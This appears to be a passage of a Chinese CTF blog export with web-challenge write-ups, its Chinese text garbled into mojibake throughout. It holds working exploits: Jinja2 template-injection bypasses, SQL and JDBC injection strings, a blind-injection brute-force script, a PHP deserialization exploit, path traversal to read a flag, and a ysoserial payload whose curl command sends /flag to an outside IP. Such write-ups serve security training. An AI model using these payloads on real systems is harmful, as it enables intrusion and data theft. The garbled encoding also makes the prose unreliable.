å¯èƒ½æ­¤æ–¹æ³•åªåœ¨ç‰¹å®šç¯å¢ƒä¸‹æœ‰ç”¨ï¼Œæ®è¯´è¿™é“é¢˜æ˜¯å¯ä»¥ç”¨çš„ã€‚ äºŒã€joinæ‹¼æ¥æ„é€ globalsï¼š {% set gl=dict(glo=a,bals=a)|join%}{{gl}} æ¥ä¸‹æ¥å°±æ˜¯æƒ³åŠæ³•æ„é€ æ•°å­—å’Œç‰¹æ®Šå­—ç¬¦ã€‚ï¼ˆæ•°å­—å¯ç”¨Unicodeä¸Šé¢å†™äº†ï¼Œå°±ä¸èµ˜è¿°äº†ä¸€èˆ¬è·å–è¿™æ ·çš„ä¸œè¥¿çš„æ€è·¯æ˜¯2ä¸ªï¼Œè¦ä¹ˆåˆ©ç”¨configï¼Œè¦ä¹ˆåˆ©ç”¨()|select|stringã€‚å½“ç„¶äº†ï¼Œä¸€èˆ¬ä¼šæƒ³ç€å…ˆå¼„åˆ°æ•°å­—ã€‚æ•°å­—çš„æ€è·¯å¤§æ¦‚ä¹Ÿæ˜¯2ä¸ªï¼Œè¦ä¹ˆåˆ©ç”¨å†…ç½®çš„è¿‡æ»¤å™¨countæˆ–è€…lengthï¼Œè¦ä¹ˆç”¨indexã€‚è¿™é¢˜è¿‡æ»¤äº†countå’Œlengthï¼Œæˆ‘è€ƒè™‘ç”¨indexæ¥å¾—åˆ°æ•°å­—ï¼ˆå½“ç„¶ï¼Œç”¨unicodeçš„è¯å°±å˜å¾—éå¸¸ç®€å•äº†ï¼Œä¸è¿‡æˆ‘åªè®²ä¸€ä¸‹ä¸åˆ©ç”¨unicodeçš„æ€è·¯ï¼‰ï¼ŒåŸç†æ˜¯è¿™æ ·ï¼š {{lipsum|string|lust}} {{(lipsum|string|list).index('f')}} æ³¨ï¼šindexå–å¾—å­—ç¬¦ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ä½†æ˜¯å•å¼•å·æ­¤é¢˜è¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥ç”¨æ‹¼æ¥èµ‹å€¼æ¥ä»£æ›¿å•å¼•å·çš„ä½œç”¨ï¼š {% set num=dict(f=a)|join%}{{(lipsum|string|list).index(num)}} æˆåŠŸå–åˆ°1 lipsumä¸­å·²æœ‰ä¸‹åˆ’çº¿ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿˜éœ€è¦æ–¹æ‹¬å·å’Œç‚¹ã€‚ æ–¹æ‹¬å·ï¼š{{(lipsum|string|list).pop(18)}} ç‚¹ï¼šatträ»£æ›¿ æ¥ä¸‹æ¥å°±å¾ˆç®€å•äº†ï¼Œæ‹¼æ¥è°ƒç”¨å®Œäº‹ç›´æ¥æ”¾åˆ«çš„å¸ˆå‚…çš„payloadï¼š æ„é€ å‡ºæ¥äº†å°±å¯ä»¥éšæ„ç»„äº†ï¼Œè¿™ä½å¸ˆå‚…çš„payloadç¡®å®æ˜¯æœ‰äº›å¤æ‚äº†ï¼Œæœ‰äº›åœ°æ–¹å¯ä»¥ä¼˜åŒ–çš„ï¼Œåº”è¯¥æ˜¯æ¯”èµ›çš„æ—¶å€™æ²¡æ—¶é—´ã€‚flagå°±æ˜¯æ–‡ä»¶åã€‚æ€»ç»“ï¼šè‡ªå·±è¿˜æ˜¯å¤ªæ‡’äº†ã€‚ã€‚æ˜æ˜ç¨å¾®ç ”ç©¶ä¸€ä¸‹å°±èƒ½å‡ºçš„ä¸œè¥¿ï¼Œå¯èƒ½è¿™å°±æ˜¯å’Œå¤§å¸ˆå‚…ä»¬çš„å·®è·å§ã€‚ é“¾æ¥ï¼šSSTIè¿‡æ»¤æ€»ç»“ï¼šhttps://blog.csdn.net/miuzzx/article/details/110220425WPå‚è€ƒï¼šhttps://blog.csdn.net/rfrder/article/details/115272645https://jan.show/?p=59","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}],"tags":[],"keywords":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}]},{"title":"BUUè¿‘æœŸåˆ·é¢˜è®°å½•","slug":"BUUè¿‘æœŸåˆ·é¢˜è®°å½•","date":"2021-03-28T12:44:20.000Z","updated":"2021-03-28T13:02:18.469Z","comments":true,"path":"2021/03/28/BUUè¿‘æœŸåˆ·é¢˜è®°å½•/","link":"","permalink":"/2021/03/28/BUUè¿‘æœŸåˆ·é¢˜è®°å½•/","excerpt":"","text":"[Black Watch å…¥ç¾¤é¢˜]Web2Secret [Zer0pts2020]phpNantokaAdminå…³é”®è¯ï¼šsqlite trickæ ¹æ®æç¤ºè¿™æ˜¯ä¸€ä¸ª Sqlite æ•°æ®åº“ï¼Œç›¸åº”çš„æ“ä½œæœ‰åˆ›å»ºè¡¨ã€æ’å…¥å€¼å’Œåˆ é™¤è¡¨ï¼Œé‚£ä¹ˆæœ‰å¯èƒ½å­˜åœ¨æ³¨å…¥çš„æ˜¯åˆ›å»ºè¡¨å’Œæ’å…¥å€¼ï¼Œä½†æ˜¯æ’å…¥å€¼é‚£é‡Œä¼¼ä¹æ³¨ä¸äº†ï¼Œæ‰€ä»¥æ³¨å…¥ç‚¹åº”è¯¥åœ¨åˆ›å»ºè¡¨é‚£é‡Œé¦–å…ˆæˆ‘ä»¬éœ€è¦çŸ¥é“ Sqlite çš„ä¸€äº›ç‰¹æ€§å½“ Sqlite è¿›è¡Œ select æ—¶ï¼Œå¯ä»¥ç”¨[]ã€â€™ã€â€ å’Œ ` æ¥è£…é¥°åˆ—åï¼Œä½äºåˆ—ååé¢çš„å­—æ®µè¢«ç§°ä¸ºåˆ«åï¼Œå¦‚create table æ—¶æ”¯æŒä¸€ç§ as çš„è¯­æ³•å‚æ•°å¤„æœ‰ 32 é•¿åº¦çš„å­—ç¬¦é™åˆ¶ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸èƒ½è¿›è¡Œå¸¸è§„çš„æŸ¥è¡¨æŸ¥å­—æ®µï¼Œä¸è¿‡æˆ‘ä»¬ç›´æ¥ç›´æ¥æŸ¥è¯¢å½“å‰è¡¨çš„ sql è¯­å¥ï¼Œè¿˜æœ‰è¿‡æ»¤äº†ä¸€äº›æ ‡ç‚¹ç¬¦å·ï¼Œå…¶ä¸­è¿‡æ»¤äº†æ³¨é‡Šç¬¦ â€“ ï¼Œå¯ä»¥ç”¨ ; è¿›è¡Œé—­åˆæŸ¥è¯¢å½“å‰è¡¨çš„æ•°æ®æ“ä½œtable_name=kk as select [sql][&amp;columns[0][name]=1&amp;columns[0][type]=]from sqlite_master; [FBCTF2019]Products Managerå…³é”®è¯ï¼šmysql trickwww.zipæ³¨å†Œä¸ªfacebookåé¢è·Ÿå¤§äºå…­åä¸ªç©ºæ ¼çš„è´¦å·ç„¶åfacebookç™»é™†å³å¯ã€‚https://www.cnblogs.com/wkzb/p/12286303.html [ç½‘é¼æ¯ 2020 æœ±é›€ç»„]Think Javaå‚è€ƒï¼šhttps://www.bilibili.com/video/av840794036/ï¼›https://blog.csdn.net/weixin_43610673/article/details/106214366å…³é”®è¯ï¼šjdbc trickï¼›java ååºåˆ—åŒ–ç»™äº†æºç ï¼Œå¾ˆå®¹æ˜“è·Ÿè¸ªåˆ°sqlæ³¨å…¥å¤„ï¼ˆjdguiï¼‰ã€‚dbNameå¯æ§ï¼Œæºç å¦‚ä¸‹dbName = â€œjdbc:mysql://mysqldbserver:3306/â€œ + dbName;è¿™é‡Œæ˜¯ä¸€ä¸ªjdbcçš„trickjdbc:mysql://mysqldbserver:3306/?dbName=myapp?a=â€™ union select group_concat(pwd)from(user)#åœ¨jdbcåé¢åŠ é—®å·å¯ä»¥å¼•ç”¨å…¶ä¸€äº›å±æ€§ã€‚æ³¨å‡ºå¯†ç ï¼šadmin@Rrrr_ctf_asdeï¼Œä½†æ˜¯ä»éœ€è¦ç™»å½•æ¥å£ã€‚æ¥ä¸‹æ¥çœ‹åˆ°ä¸€å¼€å§‹å°±åœ¨è·‘çš„dirsearchè·‘å‡º/swagger-ui.htmlï¼Œä¹Ÿæœ‰å¸ˆå‚…è¯´çœ‹åˆ°import io.swagger.annotations.ApiOperation;åº”è¯¥èƒ½æƒ³åˆ°æœ‰swagger-ui.htmlç™»é™†æˆåŠŸï¼Œå¾—åˆ°ä¸€ä¸²rO0Aå¼€å¤´çš„ä»£ç ï¼Œæ˜¯Javaåºåˆ—åŒ–base64åŠ å¯†çš„æ•°æ®å¼€å¤´ã€‚å¦‚æœä»¥acedå¼€å¤´ï¼Œé‚£ä¹ˆä»–å°±æ˜¯è¿™ä¸€æ®µJavaåºåˆ—åŒ–çš„16è¿›åˆ¶/common/user/current æŸ¥çœ‹ç”¨æˆ·ä¿¡æ¯ï¼Œauth å¤´æ˜¯ä¸€ä¸ªåºåˆ—åŒ–åçš„ä¿¡æ¯ï¼Œåœ¨æŸ¥çœ‹ç”¨æˆ·ä¿¡æ¯æ—¶æäº¤è¿™ä¸ªBearer tokenè¿›è¡Œååºåˆ—åŒ–ã€‚ç”¨ysoserial æ‰“java -jar ysoserial-0.0.5.jar ROME â€œcurl http://121.196.169.53:3333 -d @/flagâ€ | base64 -w 0currentæ‰“è¿‡å»ï¼ŒVPSç›‘å¬3333ç«¯å£æˆ‘è¿™é‡Œç›´æ¥å¸¦å‡ºæ•°æ®ï¼Œçœ‹åˆ°æœ‰çš„å¸ˆå‚…èƒ½æ‹¿åˆ°æƒé™æœ‰çš„ä¸èƒ½ï¼Œå‘ç”Ÿç”šä¹ˆäº‹äº†ã€‚å¼¹shellå‘½ä»¤ï¼šhttps://www.cnblogs.com/20175211lyz/p/12397933.html [HCTF 2018]Hideandseekå…³é”®è¯ï¼šè½¯é“¾æ¥æ–‡ä»¶è¯»å– sessionä¼ªé€  ä¼ªéšæœºæ•°ln -s /proc/self/environ troyezip -y troye.zip troyeè¯»å–çš„å†…å®¹ï¼š HOSTNAME=4ae8a62e14bcSHLVL=1PYTHON_PIP_VERSION=19.1.1HOME=/rootGPG_KEY=0D96DF4D4110E5C43FBFB17F2D347EA6AA65421DUWSGI_INI=/app/uwsgi.iniWERKZEUG_SERVER_FD=3NGINX_MAX_UPLOAD=0UWSGI_PROCESSES=16STATIC_URL=/static_=/usr/local/bin/pythonUWSGI_CHEAPER=2WERKZEUG_RUN_MAIN=trueNGINX_VERSION=1.15.8-1~stretchPATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binNJS_VERSION=1.15.8.0.2.7-1~stretchLANG=C.UTF-8PYTHON_VERSION=3.6.8NGINX_WORKER_PROCESSES=1LISTEN_PORT=80STATIC_INDEX=0PWD=/appPYTHONPATH=/appSTATIC_PATH=/app/staticFLAG=not_flag æ— keyï¼Œç»§ç»­è¯»å–/app/uwsgi.ini[uwsgi]module = maincallable=applogto = /tmp/hard_t0_guess_n9p2i5a6d1s_uwsgi.log ç»§ç»­è¯»å–æºç /app/mainè¯»ä¸å‡ºæ¥ï¼Œçœ‹äº†wpå¯èƒ½æ˜¯buuç¯å¢ƒé—®é¢˜ï¼Œè¿™é‡Œåº”è¯¥æ˜¾ç¤º/app/hard_t0_guess_n9f5a95b5ku9fg/hard_t0_guess_also_df45v48ytj9_main.py æ‰€ä»¥è¯»å–/app/hard_t0_guess_n9f5a95b5ku9fg/hard_t0_guess_also_df45v48ytj9_main.pyéƒ¨åˆ†ä»£ç ï¼šrandom.seed(uuid.getnode())app = Flask(name)app.config[â€˜SECRET_KEYâ€™] = str(random.random()*100)æ˜¾ç„¶æ˜¯ä¸ªä¼ªéšæœºæ•°ï¼Œç™¾åº¦uuid.getnode()å¾—ï¼šon a machine with multiple network interfaces the MAC address of any one of them may be returned.ï¼ˆè¿™ä¸ªå‡½æ•°å¯ä»¥è·å–ç½‘å¡macåœ°å€å¹¶è½¬æ¢æˆåè¿›åˆ¶æ•°è¿”å›ï¼‰/proc/net/arpæŸ¥çœ‹è¿æ¥åˆ°æœ¬æœºçš„è¿œç«¯ipçš„macåœ°å€/sys/class/net/eth0/address æŸ¥çœ‹eth0çš„macåœ°å€ï¼ˆç”¨è¿™ä¸ªï¼‰å¾—åˆ°02:42:ac:10:b7:0epython3 flask_session_manager.py encode -s â€˜61.372777952686â€™ -t â€œ{â€˜usernameâ€™:â€™adminâ€™}â€ [FireshellCTF2020]URL TO PDFå…³é”®è¯ï¼šWeasyPrintçœ‹ä¸Šå»æ˜¯ssrfï¼Œä½†æ˜¯è¾“å•¥éƒ½æ˜¯invalid urlã€‚è¿ä¸€ä¸‹è‡ªå·±æœåŠ¡å™¨è¯•è¯•ï¼šUser-Agent: WeasyPrint 51 (http://weasyprint.org/)google å¯ä»¥è§£ææˆ–åœ¨è‡ªå·±vpsä¸Šå¸ƒç½®ä¸€ä¸ªhtmlå³å¯ã€‚ PyCalX 1&amp;2å…³é”®è¯ï¼špythonå‚è€ƒï¼šhttps://www.secpulse.com/archives/73724.htmlé¦–å…ˆæ˜¯PyCalX 1ï¼šï¼ˆè¿™é“é¢˜1å’Œ2æ”¾ä¸€èµ·äº†æ ¹æ®æºç ï¼Œflagå·²ç»åœ¨FLAGå˜é‡é‡Œäº†ï¼Œæ‰€ä»¥åªè¦æƒ³åŠæ³•è¯»å–å³å¯ã€‚ä½†æ˜¯æœ‰ä¸¤ä¸ªè¿‡æ»¤çš„å‡½æ•° def get_value(val): val = str(val)[:64] if str(val).isdigit(): return int(val) blacklist = [&#39;(&#39;,&#39;)&#39;,&#39;[&#39;,&#39;]&#39;,&#39;\\&#39;&#39;,&#39;&quot;&#39;] # I don&#39;t like tuple, list and dict. if val == &#39;&#39; or [c for c in blacklist if c in val] != []: print(&#39;&lt;center&gt;Invalid value&lt;/center&gt;&#39;) sys.exit(0) return val def get_op(val): val = str(val)[:2] list_ops = [&#39;+&#39;,&#39;-&#39;,&#39;/&#39;,&#39;*&#39;,&#39;=&#39;,&#39;!&#39;] if val == &#39;&#39; or val[0] not in list_ops: print(&#39;&lt;center&gt;Invalid op&lt;/center&gt;&#39;) sys.exit(0) return val æœ¬åœ°ç²¾ç®€ä»£ç æµ‹è¯•ä¸€ä¸‹paylaod #coding=utf-8import sysfrom html import escape def get_value(val): val = str(val)[:64] if str(val).isdigit(): return int(val) blacklist = [â€˜(â€˜, â€˜)â€™, â€˜[â€˜, â€˜]â€™, â€˜\\â€™â€™, â€˜â€œâ€˜] # I donâ€™t like tuple, list and dict. if val == â€˜â€™ or [c for c in blacklist if c in val] != []: print(â€˜Invalid valueâ€˜) sys.exit(0) return val def get_op(val): val = str(val)[:2] list_ops = [â€˜+â€™, â€˜-â€˜, â€˜/â€˜, â€˜*â€™, â€˜=â€™, â€˜!â€™] if val == â€˜â€™ or val[0] not in list_ops: print(â€˜Invalid opâ€˜) sys.exit(0) return val value1=â€1â€value2=â€2â€op=â€+â€value1=get_value(value1)value2=get_value(value2)op=get_op(op)calc_eval = str(repr(value1)) + str(op) + str(repr(value2))result = str(eval(calc_eval))print(â€˜&gt;&gt;&gt;&gt; print(â€˜+escape(calc_eval)+â€™)â€™)print(result) å…¶ä¸­get_opå‡½æ•°æ˜¯ä¸¤ä½ä½†æ˜¯å´åªæ£€æµ‹ç¬¬ä¸€ä½ï¼Œå¾ˆæ˜æ˜¾å¯ä»¥åˆ©ç”¨ã€‚repr() å‡½æ•°å°†å¯¹è±¡è½¬åŒ–ä¸ºä¾›è§£é‡Šå™¨è¯»å–çš„å½¢å¼ï¼Œå½“ä¼ å…¥ä¸æ˜¯æ•°å­—æ˜¯å­—ç¬¦ä¸²çš„æ—¶å€™ï¼Œä¼šå¼•å…¥å¼•å·ã€‚æ‰€ä»¥å½“æˆ‘ä»¬ä¼ å…¥value1=â€™aâ€™,value2=â€™aâ€™,op=â€+â€™â€æ—¶ï¼Œè¯­å¥å˜ä¸ºâ€™aâ€™+â€™â€™aâ€™ï¼Œè‚¯å®šä¼šæŠ¥é”™ã€‚æ³¨é‡Šæ‰åé¢é‚£ä¸ªå¼•å·åï¼Œå³ value1=â€™aâ€™,value2=â€™#aâ€™,op=â€+â€™â€ï¼Œè¯­å¥å˜ä¸ºâ€™aâ€™+â€™â€™#aâ€™ è¾“å‡ºaï¼Œå•å¼•å·æˆåŠŸé€ƒé€¸ã€‚åˆ©ç”¨ value1=â€aâ€ value2=â€ and 1#aâ€ op=â€+â€™â€ è¯­å¥ä¸ºâ€™aâ€™+â€™â€™ and 1 #aã€‚å…ˆåŠ æ³•åä¸è¿ç®—ï¼Œè¾“å‡º1ã€‚ç„¶è€Œè¿™é‡Œæ— æ³•ç›´æ¥è¾“å‡ºflagï¼Œå› ä¸ºè¾“å‡ºæœ‰ä¸€ä¸ªæ¡ä»¶ï¼šif result.isdigit() or result == â€˜Trueâ€™ or result == â€˜Falseâ€™: print(result)resultå¿…é¡»æœ‰ç»“æœæˆ–è€…æ˜¯boolå€¼ã€‚ä½†æ˜¯ç”±äºè¿‡æ»¤äº†æ‹¬å· æ–¹æ‹¬å·ï¼Œå¾ˆéš¾ç›´æ¥è¿›è¡Œåˆ¤æ–­ã€‚è¿™é‡Œè¦ç”¨åˆ°ä¹‹å‰çš„sourceå˜é‡ã€‚ arguments = cgi.FieldStorage() if â€˜sourceâ€™ in arguments: source = arguments[â€˜sourceâ€™].valueelse: source = 0 if source == â€˜1â€™: print(â€˜â€˜+escape(str(open(file,â€™râ€™).read()))+â€™â€˜) sourceèµ‹å€¼ä½¿ç”¨åä»ç„¶å­˜åœ¨ï¼Œæ˜¯æˆ‘ä»¬çš„å¯æ§ç‚¹ï¼Œä¸”æ— è¿‡æ»¤å‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å®ƒé…åˆinè¿›è¡ŒçŒœè§£Flagï¼ŒçŒœè§£æˆåŠŸé¡µé¢è¿”å›Trueï¼Œé”™è¯¯åˆ™è¿”å›Flaseã€‚ ?value1=a&amp;op=%2b%27&amp;value2=and%20True%20and%20source%20in%20FLAG%23&amp;source=fè¿”å›TrueExpï¼š import requestsfrom urllib.parse import quote flag = â€œflag{â€œurl = â€œhttp://ff388d1d-d624-45f2-baad-198952fd236b.node3.buuoj.cn/cgi-bin/pycalx.py?value1=a&amp;op=%2b%27&amp;value2=and%20True%20and%20source%20in%20FLAG%23&amp;source={0}â€.format(quote(flag))for a in range(1,100): url = â€œhttp://ff388d1d-d624-45f2-baad-198952fd236b.node3.buuoj.cn/cgi-bin/pycalx.py?value1=a&amp;op=%2b%27&amp;value2=and%20True%20and%20source%20in%20FLAG%23&amp;source={0}â€.format(quote(flag)) for i in range(32,128): nurl = url + quote(chr(i)) r = requests.get(url=nurl) #print(nurl) if &quot;False&quot; in r.text: nurl = url continue else: flag+=chr(i) print(flag) å¿˜è®°ç”¨äºŒåˆ†æ³•ç¡®å®æ˜¯æœ‰äº›æ†¨æ‰¹äº†ã€‚PyCalx2è¿‡æ»¤äº†opé‡Œçš„å¼•å·ã€‚æ ¹æ®ä¸Šä¸€é¢˜çš„Flagï¼Œå¯ä»¥çŸ¥é“ç‰ˆæœ¬æ˜¯python3.6ï¼Œè¿™é‡Œéœ€è¦ä½¿ç”¨F-strings.ã€‚ï¼ˆåŸé¢˜flagï¼‰F-stringsæä¾›äº†ä¸€ç§æ˜ç¡®ä¸”æ–¹ä¾¿çš„æ–¹å¼å°†pythonè¡¨è¾¾å¼åµŒå…¥åˆ°å­—ç¬¦ä¸²ä¸­æ¥è¿›è¡Œæ ¼å¼åŒ–ã€‚ä½¿ç”¨F-stringsæˆ‘ä»¬ä¸ç”¨é€ƒé€¸å•å¼•å·ï¼Œå› ä¸ºå®ƒæ”¯æŒè¡¨è¾¾å¼ã€‚ ä»¥f å¼€å¤´ï¼Œè¡¨è¾¾å¼æ’åœ¨å¤§æ‹¬å·{} é‡Œï¼Œåœ¨è¿è¡Œæ—¶è¡¨è¾¾å¼ä¼šè¢«è®¡ç®—å¹¶æ›¿æ¢æˆå¯¹åº”çš„å€¼ã€‚ str(repr(â€˜Tâ€™))+str(â€˜+fâ€™)+str(repr(â€˜ru{FLAG&lt;source or 14:x}â€™)) # 14çš„åå…­è¿›åˆ¶è¡¨ç¤ºæ—¶â€™eâ€™â€œâ€˜Tâ€™+fâ€™ru{FLAG&lt;source or 14:x}â€™â€eval(str(repr(â€˜Tâ€™))+str(â€˜+fâ€™)+str(repr(â€˜ru{1 or 14:x}â€™)))â€˜Tru1â€™ # è¿”å›Invalideval(str(repr(â€˜Tâ€™))+str(â€˜+fâ€™)+str(repr(â€˜ru{0 or 14:x}â€™)))â€˜Trueâ€™ [æå®¢å¤§æŒ‘æˆ˜ 2020]Greatphpå…³é”®è¯ï¼šphpå†…ç½®ç±»çš„åˆ©ç”¨å‚è€ƒï¼šhttps://github.com/WAY29/geek-2020-challenges/blob/main/roamphp7-greatphp/wp/wp.mdhttps://cn-sec.com/archives/286121.htmlï¼ˆPHPåŸç”Ÿç±»åˆ©ç”¨å°ç»“ï¼Œå¾ˆä¸é”™ï¼‰ class SYCLOVER { public $syc; public $lover; public function __wakeup(){ if( ($this-&gt;syc != $this-&gt;lover) &amp;&amp; (md5($this-&gt;syc) === md5($this-&gt;lover)) &amp;&amp; (sha1($this-&gt;syc)=== sha1($this-&gt;lover)) ){ if(!preg_match(&quot;/\\&lt;\\?php|\\(|\\)|\\&quot;|\\&#39;/&quot;, $this-&gt;syc, $match)){ eval($this-&gt;syc); } else { die(&quot;Try Hard !!&quot;); } } } } æ­£å¸¸æ¥çœ‹çš„è¯ï¼Œåˆè¦è¿‡ifåˆè¦è¿‡wafè¿˜è¦å‘½ä»¤æ‰§è¡Œï¼Œä¼¼ä¹æ˜¯ä¸€ä»¶ä¸å¯èƒ½çš„äº‹æƒ…ã€‚æ‰€ä»¥è¿™é‡Œè¦ç”¨åˆ°å†…ç½®ç±»errorã€‚è€ƒç‚¹æ˜¯md5/sha1å¯ä»¥å¯¹ä¸€ä¸ªç±»è¿›è¡Œhash,ä¼šè§¦å‘ä¸€ä¸ªç±»çš„__toStringæ–¹æ³•,è¿™é‡Œç”±äºæ²¡æœ‰å¯ä»¥åˆ©ç”¨çš„ç±»,æ‰€ä»¥éœ€è¦å¯»æ‰¾åŸç”Ÿç±»,æ¯”å¦‚Error,Exceptionç­‰,ç„¶åç”±äºErrorçš„toStringæ˜¯æ— æ³•å®Œå…¨æ§åˆ¶çš„,ä¼šæœ‰å…¶ä»–è¾“å‡º,æ‰€ä»¥ä½¿ç”¨?&gt;&lt;?=çš„æ–¹å¼ç»“æŸphpä»è€Œå®Œæ•´æ§åˆ¶æ•´å—ä»£ç ,(è¿™é‡Œæœ‰ä¸ªå‘å°±æ˜¯Errorå¿…é¡»ä¸ç­‰,ä½†toStringç”Ÿæˆçš„ç»“æœå¿…é¡»ç›¸ç­‰,ç”±äºtoStringç”Ÿæˆçš„ç»“æœåŒ…å«å½“å‰ä»£ç æ‰€åœ¨çš„è¡Œ,æ‰€ä»¥æ–°ç”Ÿæˆçš„2ä¸ªå®ä¾‹å¿…é¡»åœ¨åŒä¸€è¡Œ),å› ä¸ºç¦ç”¨äº†å°æ‹¬å·æ— æ³•è°ƒç”¨å‡½æ•°,å°è¯•ç›´æ¥include â€œ/flagâ€å³å¯. expï¼š &lt;?php class SYCLOVER { public $syc; public $lover; public function __wakeup() { if (($this-&gt;syc != $this-&gt;lover) &amp;&amp; (md5($this-&gt;syc) === md5($this-&gt;lover)) &amp;&amp; (sha1($this-&gt;syc) === sha1($this-&gt;lover))) { if (!preg_match(&quot;/\\&lt;\\?php|\\(|\\)|\\&quot;|\\&#39;/&quot;, $this-&gt;var1, $match)) { eval($this-&gt;syc); } else { die(&quot;Try Hard !!&quot;); } } } } $str = &quot;?&gt;&quot;.&quot;&lt;?=include~&quot;.urldecode(&quot;%D0%99%93%9E%98&quot;).&quot;?&gt;&quot;; $a = new Exception($str, 1);$b = new Exception($str, 2); $c = new SYCLOVER(); $c-&gt;syc = $a; $c-&gt;lover = $b; echo(urlencode(serialize($c))); ?&gt; [ç½‘é¼æ¯ 2020 åŠå†³èµ›]fakaå…³é”®è¯ï¼štp5ä¸€ä¸ªå‘å¡å¹³å°æ²¡æ‰¾åˆ°æ˜æ˜¾çš„åˆ©ç”¨ç‚¹ï¼Œè¿™ç§ç°æˆçš„å¹³å°åŸºæœ¬ä¸Šéƒ½æ˜¯æœ‰cveçš„ã€‚ç»™äº†æºç ï¼Œåœ¨tk.sqlæ‰¾åˆ°adminå¯†ç ï¼Œè§£å¯†å¾—admincccbbb123ï¼ŒæˆåŠŸç™»å½•åå°ã€‚æœ‰ç‚¹åƒä¹‹å‰ä¸€ä¸ªæ›´æ¢ä¸»é¢˜getshellçš„ï¼Œä½†è¿™é‡Œä¸æ˜¯ã€‚æœ‰ä¸¤ç§è§£æ³•ã€‚ ä¸€ã€ä»»æ„æ–‡ä»¶è¯»å–seayä¹Ÿæç¤ºè¿™é‡Œå¯èƒ½å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–ã€‚ä½†æ˜¯æç¤ºçš„ä½ç½®æœ‰600å¤„æ²¡æ³¨æ„åˆ°ã€‚ä½ç½®ï¼šapplication/manage/controller/Backup.phpæºç ï¼š function downloadBak() { $file_name = $_GET[â€˜fileâ€™]; $file_dir = $this-&gt;config[â€˜pathâ€™]; if (!file_exists($file_dir . â€œ/â€œ . $file_name)) { //æ£€æŸ¥æ–‡ä»¶æ˜¯å¦å­˜åœ¨ return false; exit; } else { $file = fopen($file_dir . â€œ/â€œ . $file_name, â€œrâ€); // æ‰“å¼€æ–‡ä»¶ // è¾“å…¥æ–‡ä»¶æ ‡ç­¾ header(â€˜Content-Encoding: noneâ€™); header(â€œContent-type: application/octet-streamâ€); header(â€œAccept-Ranges: bytesâ€); header(â€œAccept-Length: â€œ . filesize($file_dir . â€œ/â€œ . $file_name)); header(â€˜Content-Transfer-Encoding: binaryâ€™); header(â€œContent-Disposition: attachment; filename=â€ . $file_name); //ä»¥çœŸå®æ–‡ä»¶åæä¾›ç»™æµè§ˆå™¨ä¸‹è½½ header(â€˜Pragma: no-cacheâ€™); header(â€˜Expires: 0â€™); //è¾“å‡ºæ–‡ä»¶å†…å®¹ echo fread($file, filesize($file_dir . â€œ/â€œ . $file_name)); fclose($file); exit; } }/manage/Backup/downloadBak?file=../../../../../../flag.txt äºŒã€åå°æ–‡ä»¶ä¸Šä¼ GetShellä½ç½®ï¼šapplication/admin/controller/Plugs.phpä¸Šä¼ çš„æ—¶å€™ä¼šå…ˆè°ƒç”¨ upstate public function upstate() { $post = $this-&gt;request-&gt;post(); $filename = join(&#39;/&#39;, str_split($post[&#39;md5&#39;], 16)) . &#39;.&#39; . pathinfo($post[&#39;filename&#39;], 4); // æ£€æŸ¥æ–‡ä»¶æ˜¯å¦å·²ä¸Šä¼  if (($site_url = FileService::getFileUrl($filename))) { $this-&gt;result([&#39;site_url&#39; =&gt; $site_url], &#39;IS_FOUND&#39;); } // éœ€è¦ä¸Šä¼ æ–‡ä»¶ï¼Œç”Ÿæˆä¸Šä¼ é…ç½®å‚æ•° $config = [&#39;uptype&#39; =&gt; $post[&#39;uptype&#39;], &#39;file_url&#39; =&gt; $filename]; switch (strtolower($post[&#39;uptype&#39;])) { case &#39;qiniu&#39;: $config[&#39;server&#39;] = FileService::getUploadQiniuUrl(true); $config[&#39;token&#39;] = $this-&gt;_getQiniuToken($filename); break; case &#39;local&#39;: $config[&#39;server&#39;] = FileService::getUploadLocalUrl(); $config[&#39;token&#39;] = md5($filename . session_id()); break; case &#39;oss&#39;: $time = time() + 3600; $policyText = [ &#39;expiration&#39; =&gt; date(&#39;Y-m-d&#39;, $time) . &#39;T&#39; . date(&#39;H:i:s&#39;, $time) . &#39;.000Z&#39;, &#39;conditions&#39; =&gt; [[&#39;content-length-range&#39;, 0, 1048576000]], ]; $config[&#39;policy&#39;] = base64_encode(json_encode($policyText)); $config[&#39;server&#39;] = FileService::getUploadOssUrl(); $config[&#39;site_url&#39;] = FileService::getBaseUriOss() . $filename; $config[&#39;signature&#39;] = base64_encode(hash_hmac(&#39;sha1&#39;, $config[&#39;policy&#39;], sysconf(&#39;storage_oss_secret&#39;), true)); $config[&#39;OSSAccessKeyId&#39;] = sysconf(&#39;storage_oss_keyid&#39;); } $this-&gt;result($config, &#39;NOT_FOUND&#39;); } ä¸»è¦ä½œç”¨å¦‚ä¸‹ï¼š1ã€å°†é€šè¿‡ POST ä¼ å…¥çš„ md5 å€¼ä»¥16ä½å­—æ¯ä¸ºé—´éš”è¿›è¡Œåˆ†å‰²ï¼Œå¹¶æ‹¼æ¥ä¼ å…¥filename çš„åç¼€2ã€æ£€æµ‹æ–‡ä»¶æ˜¯å¦ä¸Šä¼ 3ã€ç”Ÿæˆ config æ•°ç»„ï¼Œå¹¶æ·»åŠ æ¯ä¸€ä¸ªé”®çš„å€¼ ä¹‹åè°ƒç”¨ upload ï¼Œè¿™é‡Œçœ‹æ–‡ä»¶ä¸Šä¼ å¤„ç†çš„ä½ç½®ï¼ˆ359è¡Œ public function upload() { $file = $this-&gt;request-&gt;file(â€˜fileâ€™); $ext = strtolower(pathinfo($file-&gt;getInfo(â€˜nameâ€™), 4)); $md5 = str_split($this-&gt;request-&gt;post(â€˜md5â€™), 16); $filename = join(â€˜/â€˜, $md5) . â€œ.{$ext}â€; if (strtolower($ext) == â€˜phpâ€™ || !in_array($ext, explode(â€˜,â€™, strtolower(sysconf(â€˜storage_local_extsâ€™))))) { return json([â€˜codeâ€™ =&gt; â€˜ERRORâ€™, â€˜msgâ€™ =&gt; â€˜æ–‡ä»¶ä¸Šä¼ ç±»å‹å—é™â€™]); } // 